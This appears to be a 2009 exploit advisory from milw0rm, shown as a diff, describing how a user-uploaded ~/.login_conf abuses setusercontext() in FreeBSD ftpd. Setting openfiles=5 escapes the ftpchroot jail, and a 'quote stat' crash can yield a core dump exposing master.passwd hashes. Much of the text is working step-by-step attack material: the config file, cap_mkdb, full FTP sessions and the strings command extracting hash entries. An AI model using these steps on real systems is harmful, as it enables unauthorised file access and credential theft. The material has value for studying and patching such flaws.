@@ -1,0 +1,138 @@
+*BSD setusercontext vulnerabilites
+discovered by Kingcope, July 2009
+
+lewls XD
+Let's go..
+BSD derived operating systems have a special function to set a "user context".
+The function setusercontext() is available on for example FreeBSD 5.0 and 7.0.
+An example from ftpd.c :
+
+	setusercontext(lc, pw, (uid_t)0,
+		LOGIN_SETLOGIN|LOGIN_SETGROUP|LOGIN_SETPRIORITY|
+		LOGIN_SETRESOURCES|LOGIN_SETUMASK);
+
+An interesing setting here is LOGIN_SETRESOURCES with which a USER is allowed
+to set resources actually.
+
+From the manpage:
+
+     LOGIN_SETRESOURCES  Set resource limits for the current process based on
+			 values specified in the system login class database.
+			 Class capability tags used, with and without -cur
+			 (soft limit) or -max (hard limit) suffixes and the
+			 corresponding resource setting:
+
+			 cputime       RLIMIT_CPU
+			 filesize      RLIMIT_FSIZE
+			 datasize      RLIMIT_DATA
+			 stacksize     RLIMIT_STACK
+			 coredumpsize  RLIMIT_CORE
+			 memoryuse     RLIMIT_RSS
+			 memorylocked  RLIMIT_MEMLOCK
+			 maxproc       RLIMIT_NPROC
+			 openfiles     RLIMIT_NOFILE
+			 sbsize        RLIMIT_SBSIZE
+			 vmemoryuse    RLIMIT_VMEM
+
+Now one can set (means: upload) their own ~/.login_conf and play around a bit.
+For example the chroot() call in ftpd.c can be bypassed
+by setting "openfiles" to a value of 5.
+The following example shows:
+- User "kcope" is in /etc/ftpchroot and therefore is chrooted in
+  his home directory when logging in
+- Using the setusercontext() technique we can easily circumvent
+  the chroot() call resulting in an access to all files after a login.
+- The problem here is now we cannot "ls", "get" or "put" using the ftp
+  client. The cause is the open files restriction. All commands which
+  do not require opening files are available though including mkdir,
+  chmod, rm etc.
+
+Example (the files .login_conf and .login_conf.db are uploaded before
+doing this):
+---snip---
+%cat /etc/ftpchroot
+kcope
+%cat .login_conf
+me:\
+  :openfiles=5:
+
+%cap_mkdb .login_conf
+%ftp 192.168.2.4
+Connected to 192.168.2.4.
+220  FTP server (Version 6.00LS) ready.
+Name (192.168.2.4:root): kcope
+331 Password required for kcope.
+Password:
+230 User kcope logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> pwd
+Remote directory: /usr/home/kcope
+ftp> mkdir /tmp/foobar
+257 "/tmp/foobar" directory created.
+ftp> ls
+425 Can't open passive connection: Too many open files.
+425 Can't open passive connection: Too many open files.
+200 PORT command successful.
+550 /bin/ls -lgA: Too many open files.
+ftp>
+---snip---
+
+Another attack involves the option "stacksize" in ~/.login_conf,
+which can be used to set the maximum stack size the process may use
+after the setusercontext() call.
+I am currently researching if the SIGSEGVS in arbitrary locations 
+(depended on the stacksize) may be used to execute arbitrary code. It looks promising.
+
+For now there is the really small possiblity that the sysctl setting "kern.sugid_coredump"
+is set on the target FreeBSD system to '1' and therefore allows setuid and setgid core dumps.
+In the example we use the "STAT" ftp command with openfiles=5 and the ftp will crash creating
+a core dump in the kcope home directory which contains for example the master.passwd entries
+(of course only when kern.sugid_coredump sysctl setting is set to '1'.)
+
+Example:
+
+# sysctl -a | grep sugid
+kern.sugid_coredump: 0
+# sysctl kern.sugid_coredump=1
+kern.sugid_coredump: 0 -> 1
+%cat .login_conf
+me:\
+  :openfiles=5:
+
+%ftp 192.168.2.4
+Connected to 192.168.2.4.
+220  FTP server (Version 6.00LS) ready.
+Name (192.168.2.4:root): kcope
+331 Password required for kcope.
+Password:
+230 User kcope logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> quote stat foo
+213- Status of foo:
+421 Service not available, remote server has closed connection.
+ftp> quit
+%tail /var/log/messages
+...
+Jul 29 04:28:46  kernel: pid 3663 (ftpd), uid 1001: exited on signal 11 (core dumped)
+%
+%ls -la ~/ftpd.core
+-rw-------  1 kcope  users  2150400 Jul 29 04:28 /home/kcope/ftpd.core
+%strings ftpd.core | grep \$1
+$1$2qRDatb.$6.x04oHbLcrSSdHu4Kohg0
+$1$2qRDatb.$6.x04oHbLcrSSdHu4Kohg0
+$1$2qRDatb.$6.x04oHbLcrSSdHu4Kohg0
+$1$fXHQPE4.$Xu6RC2GoZG2j0inNHMS4V/
+$1$fXHQPE4.$Xu6RC2GoZG2j0iNNHMS4V/
+... (many entries)
+
+(These are of course not my real encrypted passwds XD)
+As mentioned before this _might_ be used to execute arbitrary code I am still researching that.
+
+Cheers,
+
+Contact: kcope2@googlemail.com isowarez.de/
+Kingcope 
+
+# milw0rm.com [2009-08-24]
